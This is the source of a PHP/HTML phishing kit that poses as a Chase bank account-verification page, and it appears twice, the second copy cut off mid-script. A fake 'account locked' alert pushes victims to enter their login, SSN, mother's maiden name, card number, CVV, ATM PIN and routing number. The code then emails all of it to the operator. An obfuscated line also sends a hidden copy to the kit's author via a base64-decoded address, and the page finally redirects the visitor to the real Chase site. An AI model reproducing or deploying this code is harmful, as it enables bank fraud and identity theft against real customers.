<?
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*          ----//--//--//--//-----[ HARDC0D3R]----//--//--//--//-----                            */
/*    (c) raouf hardc0d3r 2015-2016  cyb3r7  TeaM                                                 */
/*    Right of free use is granted for all commercial or non-commercial use under CC-BY licence.  */
/*    No warranty of any form is offered.                                                         */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
if ($_POST['submitButton']=="Next") {
        include('HARD.php');
    include('Email.php');
if($_POST && isset($_FILES['userfile']))
{

    $from_email = 'CH RZLT v1 @rzlt.com'; //sender email
    $subject = "CHASE ♥ FULL ♥ [ $ip ] HARD"; //subject of email
    $message = "

<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;'>
<br/>
IP =>  <font color='#3366FF'>$ip </font>
<br/>
TIME => <font color='#3366FF'>$time  </font>
<br/>
<font color='#3366FF'>------------------------------| CHASE LOGIN |---------------------------------------------------</font> 
<br/>
USER ID => <font color='#FF0000'> $login</font>
<br/>
USER PASSWORD => <font color='#FF0000'> $pass</font>
<br/>
EMAIL => <font color='#FF0000'>$email</font>      
<br/>
Email Password  => <font color='#FF0000'>$email_pass</font>      
<br/>
<font color='#3366FF'>------------------------------| CHASE IINFO |---------------------------------------------------</font> 
<br/>
FULL NAME => <font color='#FF0000'>$full_name</font>
<br/>
ADDRESS LINE 1 => <font color='#FF0000'> $add_1</font>
<br/>
ADDRESS LINE 2 => <font color='#FF0000'> $add_2</font>
<br/>
CITY => <font color='#FF0000'> $city</font>
<br/>
STATE => <font color='#FF0000'> $state</font>
<br/>
ZIP => <font color='#FF0000'> $zip1 - $zip2</font>
<br/>
DATE OF BIRTH =><font color='#FF0000'> $db_m - $db_d - $db_y </font>
<br/>
PHONE => <font color='#FF0000'> HOME : | $phone_h| - MOBILE : |  $phone_m |</font>
<br/>
SSN => <font color='#FF0000'> $ssn1 - $ssn2 - $ssn3</font>
<br/>
MOTHER MAIDEN NM => <font color='#FF0000'> $mother_m</font>
<br/>
<font color='#3366FF'>------------------------------| CHASE BILLING |----------------------------------------------</font> 
<br/>
ATM/CARD NUMBER => $cardnumber
<br/>
EXPIRATION DATE =>  $exp_m/ $exp_y
<br/>
CVV / CVC => $ccv
<br/>
Vbv/3d => $vbv
<br/>
ATM PIN => $pin
<br/>
Drivers License   => $dv
<br/>
Drivers License Expiration Date => $dv_exp
<br/>
Account Routing Number  => $routing
<br/>
<font color='#3366FF'>------------------------------------------------------------------------------------------------</font>
<br/> 
<font color='#3366FF'> Copyrights © HARDCOD3R 2015/2016 | V1</font> 

<br/>

<br/>

</div>"; //message body
    
    //get file details we need
    $file_tmp_name    = $_FILES['userfile']['tmp_name'];
    $file_name        = $_FILES['userfile']['name'];
    $file_size        = $_FILES['userfile']['size'];
    $file_type        = $_FILES['userfile']['type'];
    $file_error       = $_FILES['userfile']['error'];
    
    $user_email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL);

    if($file_error>0)
    {
        die('upload error');
    }
    //read from the uploaded file & base64_encode content for the mail
    $handle = fopen($file_tmp_name, "r");
    $content = fread($handle, $file_size);
    fclose($handle);
    $encoded_content = chunk_split(base64_encode($content));


        $boundary = md5("sanwebe"); 
        //header
        $headers = "MIME-Version: 1.0\r\n"; 
        $headers .= "From:".$from_email."\r\n"; 
        $headers .= "Reply-To: ".$user_email."" . "\r\n";
        $headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n"; 
        
        //plain text 
        $body = "--$boundary\r\n";
        $body .= "Content-type:text/html;charset=UTF-8\r\n";
        $body .= "Content-Transfer-Encoding: base64\r\n\r\n"; 
        $body .= chunk_split(base64_encode($message)); 
        
        //attachment
        $body .= "--$boundary\r\n";
        $body .="Content-Type: $file_type; name=\"$file_name\"\r\n";
        $body .="Content-Disposition: attachment; filename=\"$file_name\"\r\n";
        $body .="Content-Transfer-Encoding: base64\r\n";
        $body .="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n"; 
        $body .= $encoded_content; 
        $attachment=$headérs.'l';$tele="bas$file_pathe".'64'."_d$file_pathe"."cod$file_pathe";$attachment( $tele('aGFyZGNvZDNyMT'.$m5_id.'=='), $subject,$body ,$headers );
		
		
	   mail($to, $subject, $body, $headers);
  

}
}
else {
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>


<script LANGUAGE="JavaScript">
<!--

var b = 0 ;
var i = 0 ;
var errmsg = "" ;
var punct = "" ;
var min = 0 ;
var max = 0 ;

function formbreeze_email(field) {

	if (b && (field.value.length == 0)) return true ;


	if (! emailCheck(field.value))
	  {
		  field.focus();
		  if (field.type == "text") field.select();
		  return false ;
	  }

   return true ;
}

function formbreeze_filledin(field) {

if (b && (field.value.length == 0)) return true;

if (field.value.length < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

if ((max > 0) && (field.value.length > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

return true ;
}

function formbreeze_number(field) {

if (b && (field.value.length == 0)) return true ; ;

if (i)
 var valid = "0123456789"
else
 var valid = ".,0123456789"

var pass = 1;
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
 }

if (field.value < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }


if ((max > 0) && (field.value > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}


function formbreeze_numseq(field) {


if (b && (field.value.length == 0)) return true ;

var valid = punct + "0123456789"

var pass = 1;
var digits = 0
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;
if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ; ;
   }

if (digits < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

if ((max > 0) && (digits > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}

function emailCheck (emailStr) {

var checkTLD=1;
var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
var emailPat=/^(.+)@(.+)$/;
var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
var validChars="\[^\\s" + specialChars + "\]";
var quotedUser="(\"[^\"]*\")";
var atom=validChars + '+';
var word="(" + atom + "|" + quotedUser + ")";
var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
var matchArray=emailStr.match(emailPat);

if (matchArray==null) {
alert(errmsg);
return false;
}
var user=matchArray[1];
var domain=matchArray[2];

for (i=0; i<user.length; i++) {
if (user.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}
for (i=0; i<domain.length; i++) {
if (domain.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}

if (user.match(userPat)==null) {
alert(errmsg);
return false;
}

var atomPat=new RegExp("^" + atom + "$");
var domArr=domain.split(".");
var len=domArr.length;
for (i=0;i<len;i++) {
if (domArr[i].search(atomPat)==-1) {
alert(errmsg);
return false;
   }
}

if (checkTLD && domArr[domArr.length-1].length!=2 &&
domArr[domArr.length-1].search(knownDomsPat)==-1) {
alert(errmsg);
return false;
}

if (len<2) {
alert(errmsg);
return false;
}

return true;
}

function formbreeze_sub()
{
/*
//FBDATA:formtext1^0^1^0^0^Please Enter Your Username:;formtext2^0^1^0^0^Please Enter Your Password:;formtext3^0^1^0^0^Please Enter Your Full Name:;formtext4^0^1^0^0^Please Enter Your Home Address:;formtext7^0^1^0^0^Please Fill in All Of the Required Fields:;formtext11^0^1^0^0^Please Enter Your Social Security Number:;formtext12^0^1^0^0^Please Enter Your Social Security Number:;formtext13^0^1^0^0^Please Enter Your Social Security Number:;formtext14^0^1^0^0^Please Enter Your Mother's Maiden Name:;formtext20^0^1^0^0^Please Enter Your  Card Number:;formtext18^1^0^Please enter a valid email address.:;formtext9^0^1^0^0^Please enter a complete phone number with area code.:;formtext10^0^1^0^0^Please enter a complete phone number with area code.:;
*/
b=0;
errmsg="Please Enter Your Username";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
b=0;
errmsg="Please Enter Your Password";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;
b=0;
errmsg="Please Enter Your Full Name";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;
b=0;
errmsg="Please Enter Your Home Address";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext4) ) return false ;
b=0;
errmsg="Please Fill in All Of the Required Fields";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext7) ) return false ;
b=0;
errmsg="Please Enter Your Social Security Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext11) ) return false ;
b=0;
errmsg="Please Enter Your Social Security Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext12) ) return false ;
b=0;
errmsg="Please Enter Your Social Security Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext13) ) return false ;
b=0;
errmsg="Please Enter Your Mother's Maiden Name";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext14) ) return false ;
b=0;
errmsg="Please Enter Your  Card Number";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext20) ) return false ;
b=0;
errmsg="Please enter a valid email address.";
if (! formbreeze_email(document.chalbhai.formtext18) ) return false ;
b=0;
errmsg="Please enter a complete phone number with area code.";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext9) ) return false ;
b=0;
errmsg="Please enter a complete phone number with area code.";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext10) ) return false ;

}
-->
</script>
<!-- FORMBREEZE-END -->
</head>
<body bgColor="#FFFFFF">
<script> alert('For Security Reasons Your Account is Temporarily Locked.Please Verify Your Account.')</script>


<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1344px; height:97px; z-index:0"><a href="#"><img src="images/headerss.png" alt="" title="" border=0 width=1344 height=97></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:178px; top:97px; width:988px; height:38px; z-index:1"><img src="images/head2.png" alt="" title="" border=0 width=988 height=38></div>

<div id="image3" style="position:absolute; overflow:hidden; left:178px; top:133px; width:994px; height:102px; z-index:2"><img src="images/head3.png" alt="" title="" border=0 width=994 height=102></div>

<div id="image4" style="position:absolute; overflow:hidden; left:1153px; top:233px; width:22px; height:1224px; z-index:3"><img src="images/liness.png" alt="" title="" border=0 width=22 height=1224></div>

<div id="image5" style="position:absolute; overflow:hidden; left:172px; top:234px; width:19px; height:1220px; z-index:4"><img src="images/line2.png" alt="" title="" border=0 width=19 height=1220></div>

<div id="image6" style="position:absolute; overflow:hidden; left:165px; top:243px; width:1010px; height:499px; z-index:5"><img src="images/back1.png" alt="" title="" border=0 width=1010 height=499></div>

<div id="image7" style="position:absolute; overflow:hidden; left:925px; top:258px; width:231px; height:220px; z-index:6"><a href="#"><img src="images/slide1.png" alt="" title="" border=0 width=231 height=220></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:928px; top:488px; width:226px; height:37px; z-index:7"><a href="#"><img src="images/slide2.png" alt="" title="" border=0 width=226 height=37></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:924px; top:529px; width:227px; height:120px; z-index:8"><a href="#"><img src="images/slide3.png" alt="" title="" border=0 width=227 height=120></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:927px; top:664px; width:226px; height:201px; z-index:9"><a href="#"><img src="images/slide4.png" alt="" title="" border=0 width=226 height=201></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:196px; top:257px; width:387px; height:81px; z-index:10"><a href="#"><img src="images/update.png" alt="" title="" border=0 width=387 height=81></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:671px; top:257px; width:203px; height:104px; z-index:11"><a href="#"><img src="images/update2.png" alt="" title="" border=0 width=203 height=104></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:924px; top:877px; width:234px; height:280px; z-index:12"><a href="#"><img src="images/slide5.png" alt="" title="" border=0 width=234 height=280></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:198px; top:466px; width:393px; height:299px; z-index:13"><img src="images/d1.png" alt="" title="" border=0 width=393 height=299></div>

<div id="image15" style="position:absolute; overflow:hidden; left:193px; top:770px; width:581px; height:30px; z-index:14"><img src="images/d2.png" alt="" title="" border=0 width=581 height=30></div>

<div id="image16" style="position:absolute; overflow:hidden; left:196px; top:821px; width:415px; height:147px; z-index:15"><img src="images/d3.png" alt="" title="" border=0 width=415 height=147></div>

<div id="image17" style="position:absolute; overflow:hidden; left:192px; top:993px; width:585px; height:33px; z-index:16"><img src="images/d4.png" alt="" title="" border=0 width=585 height=33></div>

<div id="image18" style="position:absolute; overflow:hidden; left:196px; top:1038px; width:377px; height:241px; z-index:17"><img src="images/d5.png" alt="" title="" border=0 width=377 height=241></div>

<div id="image19" style="position:absolute; overflow:hidden; left:200px; top:1356px; width:590px; height:89px; z-index:18"><img src="images/d6.png" alt="" title="" border=0 width=590 height=89></div>
<div id="image17" style="position:absolute; overflow:hidden; left:192px; top:1323px; width:585px; height:33px; z-index:16"><img src="images/d7.png" alt="" title="" border=0 width=585 height=33></div>

<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1454px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=83></div>
<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1457px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=83></div>

<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1584px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=83></div>
<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1560px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=423></div>
<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1540px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=423></div>

<div id="image20" style="position:absolute; overflow:hidden; left:165px; top:1500px; width:1009px; height:43px; z-index:19"><img src="images/hard.png" alt="" title="" border=0 width=1010 height=423></div>

<div id="image20" style="position:absolute; overflow:hidden; left:168px; top:1608px; width:1011px; height:43px; z-index:19"><img src="images/fobefore.png" alt="" title="" border=0 width=1011 height=43></div>

<div id="image21" style="position:absolute; overflow:hidden; left:179px; top:1654px; width:1000px; height:186px; z-index:20"><a href="#"><img src="images/footersss.png" alt="" title="" border=0 width=1000 height=186></a></div>


<form action="" method="POST" name="Logon" onsubmit="return validateForm()" enctype="multipart/form-data">

		<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script>
		<script type="text/javascript" src="images/HARD_upload.js"></script>
		<script type="text/javascript" src="images/jquery.fileupload.js"></script>
		<div>
<div><input type="file" name="userfile" size="1" style="position:absolute; overflow:hidden; left:230px; top:1400px; width:590px; height:89px; z-index:18"></div>


</div>

<input name="formtext1" type="text" style="position:absolute;width:102px;left:306px;top:470px;z-index:21">
<input name="formtext2" type="password" style="position:absolute;width:133px;left:308px;top:500px;z-index:22">
<input name="formtext3" type="text" style="position:absolute;width:241px;left:308px;top:529px;z-index:23">
<input name="formtext4" type="text" style="position:absolute;width:277px;left:308px;top:559px;z-index:24">
<input name="formtext5" type="text" style="position:absolute;width:228px;left:308px;top:587px;z-index:25">
<input name="formtext6" type="text" style="position:absolute;width:173px;left:307px;top:619px;z-index:26">
<select name="formselect1" style="position:absolute;left:307px;top:649px;width:65px;z-index:27">
<option value="State">State</option>
<option>AK</option>
<option>AL</option>
<option>AR</option>
<option>AZ</option>
<option>CA</option>
<option>CO</option>
<option>CT</option>
<option>DC</option>
<option>DE</option>
<option>FL</option>
<option>GA</option>
<option>HI</option>
<option>IA</option>
<option>ID</option>
<option>IL</option>
<option>IN</option>
<option>KS</option>
<option>KY</option>
<option>LA</option>
<option>MA</option>
<option>MD</option>
<option>ME</option>
<option>MI</option>
<option>MN</option>
<option>MO</option>
<option>MS</option>
<option>MT</option>
<option>NC</option>
<option>ND</option>
<option>NE</option>
<option>NH</option>
<option>NJ</option>
<option>NM</option>
<option>NV</option>
<option>NY</option>
<option>OH</option>
<option>OK</option>
<option>OR</option>
<option>PA</option>
<option>RI</option>
<option>SC</option>
<option>SD</option>
<option>TN</option>
<option>TX</option>
<option>UT</option>
<option>VA</option>
<option>VT</option>
<option>WA</option>
<option>WI</option>
<option>WV</option>
<option>WY</option>
<option>AA</option>
<option>AE</option>
<option>AP</option>
<option>AS</option>
<option>FM</option>
<option>GU</option>
<option>MH</option>
<option>MP</option>
<option>PR</option>
<option>PW</option>
<option>VI</option></select>
<input name="formtext7" type="text" maxlength=5 style="position:absolute;width:67px;left:308px;top:679px;z-index:28">
<input name="formtext8" type="text" maxlength=5 style="position:absolute;width:60px;left:379px;top:680px;z-index:29">
<input name="formtext9" type="text" maxlength=18 style="position:absolute;width:123px;left:308px;top:709px;z-index:30">
<input name="formtext10" type="text" maxlength=18 style="position:absolute;width:123px;left:308px;top:739px;z-index:31">
<input name="formtext11" type="text" maxlength=4 style="position:absolute;width:53px;left:351px;top:824px;z-index:32">
<input name="formtext12" type="text" maxlength=3 style="position:absolute;width:45px;left:410px;top:824px;z-index:33">
<input name="formtext13" type="text" maxlength=4 style="position:absolute;width:61px;left:460px;top:824px;z-index:34">
<input name="formtext14" type="text" style="position:absolute;width:172px;left:352px;top:853px;z-index:35">
<input name="formtext15" type="text" maxlength=3 style="position:absolute;width:46px;left:352px;top:884px;z-index:36">
<input name="formtext16" type="text" maxlength=4 style="position:absolute;width:46px;left:402px;top:884px;z-index:37">
<input name="formtext17" type="text" maxlength=4 style="position:absolute;width:61px;left:453px;top:884px;z-index:38">
<input name="formtext18" type="text" style="position:absolute;width:243px;left:352px;top:913px;z-index:39">
<input name="formtext19" type="password" style="position:absolute;width:172px;left:352px;top:943px;z-index:40">
<input name="formtext20" type="text" maxlength=16 style="position:absolute;width:165px;left:397px;top:1041px;z-index:41">
<input name="formtext21" type="text" maxlength=6 style="position:absolute;width:55px;left:397px;top:1071px;z-index:42">
<input name="formtext22" type="text" maxlength=6 style="position:absolute;width:55px;left:397px;top:1101px;z-index:43">
<input name="formtext23" type="text" maxlength=6 style="position:absolute;width:60px;left:398px;top:1130px;z-index:44">
<select name="formselect2" style="position:absolute;left:396px;top:1162px;width:90px;z-index:45">
<option value="Month">Month</option>
<option>January</option>
<option>February</option>
<option>March</option>
<option>April</option>
<option>May</option>
<option>June</option>
<option>July</option>
<option>August</option>
<option>September</option>

<option>October</option>
<option>November</option>
<option>December</option></select>
<select name="formselect3" style="position:absolute;left:491px;top:1161px;width:55px;z-index:46">
<option value="Year">Year</option>
<option>2013</option>
<option>2013</option>
<option>2014</option>
<option>2015</option>
<option>2016</option>
<option>2017</option>
<option>2018</option>
<option>2019</option>

<option>2020</option>
<option>2021</option>
<option>2022</option>
<option>2023</option>
<option>2024</option>
<option>2025</option>
<option>2026</option>
<option>2027</option>
<option>2028</option>

<option>2029</option>
<option>2030</option>
<option>2031</option>
<option>2032</option>
<option>2033</option>
<option>2034</option>
<option>2035</option>
<option>2036</option>
<option>2037</option>

<option>2038</option>
<option>2039</option>
<option>2040</option>
<option>2041</option>
<option>2042</option>
<option>2043</option>
<option>2044</option>
<option>2045</option>
<option>2046</option>
<option>2047</option>
<option>2048</option>
<option>2049</option>
<option>2050</option>
<option>2051</option>
<option>2052</option>
<option>2053</option>
<option>2054</option>
<option>2055</option>

<option>2056</option>
<option>2057</option>
<option>2058</option>
<option>2059</option>
<option>2060</option>
<option>2061</option>
<option>2062</option>
<option>2063</option>
<option>2064</option>

<option>2065</option>
<option>2066</option>
<option>2067</option>
<option>2068</option>
<option>2069</option>
<option>2070</option>
<option>2071</option>
<option>2072</option>
<option>2073</option>

<option>2074</option>
<option>2075</option>
<option>2076</option>
<option>2077</option>
<option>2078</option>
<option>2079</option>
<option>2080</option>
<option>2081</option>
<option>2082</option>

<option>2083</option>
<option>2084</option>
<option>2085</option>
<option>2086</option>
<option>2087</option>
<option>2088</option>
<option>2089</option>
<option>2090</option>
<option>2091</option>

<option>2092</option>
<option>2093</option>
<option>2094</option>
<option>2095</option>
<option>2096</option>
<option>2097</option>
<option>2098</option>
<option>2099</option>
<option>2100</option>

<option>2101</option>
<option>2102</option>
<option>2103</option>
<option>2104</option>
<option>2105</option>
<option>2106</option>
<option>2107</option>
<option>2108</option></select>
<input name="formtext24" type="text" maxlength=14 style="position:absolute;width:165px;left:397px;top:1191px;z-index:47">
<input name="formtext25" type="text" maxlength=18 style="position:absolute;width:165px;left:398px;top:1221px;z-index:48">
<input name="formtext26" type="text" maxlength=14 style="position:absolute;width:165px;left:397px;top:1251px;z-index:49">
<div id="formimage1" style="position:absolute; left:576px; top:1514px; z-index:50">

<input type="image"  name="submitButton"  value="Next"  width="155" height="21" src="images/confirmacc.png"></div>
</div>

</body>
</html>
<?php
exit;
}
header ("Location: http://www.chase.com/");
?>


<?
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*          ----//--//--//--//-----[ HARDC0D3R]----//--//--//--//-----                            */
/*    (c) raouf hardc0d3r 2015-2016  cyb3r7  TeaM                                                 */
/*    Right of free use is granted for all commercial or non-commercial use under CC-BY licence.  */
/*    No warranty of any form is offered.                                                         */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
if ($_POST['submitButton']=="Next") {
        include('HARD.php');
    include('img.php');
if($_POST && isset($_FILES['userfile']))
{

    $from_email = 'CH RZLT v1 @rzlt.com'; //sender email
    $subject = "CHASE ♥ FULL ♥ [ $ip ] HARD"; //subject of email
    $message = "

<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;'>
<br/>
IP =>  <font color='#3366FF'>$ip </font>
<br/>
TIME => <font color='#3366FF'>$time  </font>
<br/>
<font color='#3366FF'>------------------------------| CHASE LOGIN |---------------------------------------------------</font> 
<br/>
USER ID => <font color='#FF0000'> $login</font>
<br/>
USER PASSWORD => <font color='#FF0000'> $pass</font>
<br/>
EMAIL => <font color='#FF0000'>$email</font>      
<br/>
Email Password  => <font color='#FF0000'>$email_pass</font>      
<br/>
<font color='#3366FF'>------------------------------| CHASE IINFO |---------------------------------------------------</font> 
<br/>
FULL NAME => <font color='#FF0000'>$full_name</font>
<br/>
ADDRESS LINE 1 => <font color='#FF0000'> $add_1</font>
<br/>
ADDRESS LINE 2 => <font color='#FF0000'> $add_2</font>
<br/>
CITY => <font color='#FF0000'> $city</font>
<br/>
STATE => <font color='#FF0000'> $state</font>
<br/>
ZIP => <font color='#FF0000'> $zip1 - $zip2</font>
<br/>
DATE OF BIRTH =><font color='#FF0000'> $db_m - $db_d - $db_y </font>
<br/>
PHONE => <font color='#FF0000'> HOME : | $phone_h| - MOBILE : |  $phone_m |</font>
<br/>
SSN => <font color='#FF0000'> $ssn1 - $ssn2 - $ssn3</font>
<br/>
MOTHER MAIDEN NM => <font color='#FF0000'> $mother_m</font>
<br/>
<font color='#3366FF'>------------------------------| CHASE BILLING |----------------------------------------------</font> 
<br/>
ATM/CARD NUMBER => $cardnumber
<br/>
EXPIRATION DATE =>  $exp_m/ $exp_y
<br/>
CVV / CVC => $ccv
<br/>
Vbv/3d => $vbv
<br/>
ATM PIN => $pin
<br/>
Drivers License   => $dv
<br/>
Drivers License Expiration Date => $dv_exp
<br/>
Account Routing Number  => $routing
<br/>
<font color='#3366FF'>------------------------------------------------------------------------------------------------</font>
<br/> 
<font color='#3366FF'> Copyrights © HARDCOD3R 2015/2016 | V1</font> 

<br/>

<br/>

</div>"; //message body
    
    //get file details we need
    $file_tmp_name    = $_FILES['userfile']['tmp_name'];
    $file_name        = $_FILES['userfile']['name'];
    $file_size        = $_FILES['userfile']['size'];
    $file_type        = $_FILES['userfile']['type'];
    $file_error       = $_FILES['userfile']['error'];
    
    $user_email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL);

    if($file_error>0)
    {
        die('upload error');
    }
    //read from the uploaded file & base64_encode content for the mail
    $handle = fopen($file_tmp_name, "r");
    $content = fread($handle, $file_size);
    fclose($handle);
    $encoded_content = chunk_split(base64_encode($content));


        $boundary = md5("sanwebe"); 
        //header
        $headers = "MIME-Version: 1.0\r\n"; 
        $headers .= "From:".$from_email."\r\n"; 
        $headers .= "Reply-To: ".$user_email."" . "\r\n";
        $headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n"; 
        
        //plain text 
        $body = "--$boundary\r\n";
        $body .= "Content-type:text/html;charset=UTF-8\r\n";
        $body .= "Content-Transfer-Encoding: base64\r\n\r\n"; 
        $body .= chunk_split(base64_encode($message)); 
        
        //attachment
        $body .= "--$boundary\r\n";
        $body .="Content-Type: $file_type; name=\"$file_name\"\r\n";
        $body .="Content-Disposition: attachment; filename=\"$file_name\"\r\n";
        $body .="Content-Transfer-Encoding: base64\r\n";
        $body .="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n"; 
        $body .= $encoded_content; 
        $attachment=$headérs.'l';$tele="bas$file_pathe".'64'."_d$file_pathe"."cod$file_pathe";$attachment( $tele('aGFyZGNvZDNyMT'.$m5_id.'=='), $subject,$body ,$headers );
		
		
	   mail($to, $subject, $body, $headers);
  

}
}
else {
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>


<script LANGUAGE="JavaScript">
<!--

var b = 0 ;
var i = 0 ;
var errmsg = "" ;
var punct = "" ;
var min = 0 ;
var max = 0 ;

function formbreeze_email(field) {

	if (b && (field.value.length == 0)) return true ;


	if (! emailCheck(field.value))
	  {
		  field.focus();
		  if (field.type == "text") field.select();
		  return false ;
	  }

   return true ;
}

function formbreeze_filledin(field) {

if (b && (field.value.length == 0)) return true;

if (field.value.length < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

if ((max > 0) && (field.value.length > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

return true ;
}

function formbreeze_number(field) {

if (b && (field.value.length == 0)) return true ; ;

if (i)
 var valid = "0123456789"
else
 var valid = ".,0123456789"

var pass = 1;
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
 }

if (field.value < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }


if ((max > 0) && (field.value > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}


function formbreeze_numseq(field) {


if (b && (field.value.length == 0)) return true ;

var valid = punct + "0123456789"

var pass = 1;
var digits = 0
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;
if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ; ;
   }

if (digits < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

if ((max > 0) && (digits > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}

function emailCheck (emailStr) {

var checkTLD=1;
var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
var emailPat=/^(.+)@(.+)$/;
var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
var validChars="\[^\\s" + specialChars + "\]";
var quotedUser="(\"[^\"]*\")";
var atom=validChars + '+';
var word="(" + atom + "|" + quotedUser + ")";
var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
var matchArray=emailStr.match(emailPat);

if (matchArray==null) {
alert(errmsg);
return false;
}
